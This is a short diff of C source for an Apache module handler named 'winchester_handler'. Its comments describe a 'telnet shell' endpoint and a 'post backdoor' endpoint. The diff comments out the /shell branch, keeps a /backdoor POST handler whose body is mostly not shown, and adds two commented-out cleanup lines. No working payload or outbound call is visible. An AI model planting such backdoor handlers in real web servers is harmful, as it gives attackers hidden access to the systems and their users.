@@ -17,10 +17,10 @@ static int winchester_handler(request_rec *r)
     }
 
     // sub-handler for telnet shell
-    if (strcmp(r->unparsed_uri, "/shell") == 0) {
-        ap_rprintf(r, "Shell dir");
-        return DONE;
-    }
+    //if (strcmp(r->unparsed_uri, "/shell") == 0) {
+    //    ap_rprintf(r, "Shell dir");
+    //    return DONE;
+    //}
 
     // sub-handler for post backdoor
     if (strcmp(r->unparsed_uri, "/backdoor") == 0 && r->method_number == M_POST) {
@@ -67,7 +67,8 @@ static int winchester_handler(request_rec *r)
             }
 
         }
-
+        //apr_brigade_cleanup(bb_in);
+        //ap_rprintf(r, "Cleaned up brigade");
         ap_rprintf(r, "Operation successful!\n");
 
         ap_rprintf(r, "Backdoor POST");
